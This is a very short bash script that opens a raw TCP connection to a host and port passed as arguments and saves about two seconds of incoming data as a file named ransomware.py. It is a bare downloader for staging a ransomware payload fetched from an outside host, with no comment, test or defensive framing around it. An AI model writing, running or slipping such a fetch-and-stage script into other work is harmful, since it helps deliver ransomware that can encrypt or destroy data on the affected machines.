#!/bin/bash

exec 5<> /dev/tcp/$1/$2

timeout 2 cat <&5 > ransomware.py

exec 5<&-
exec 5>&-
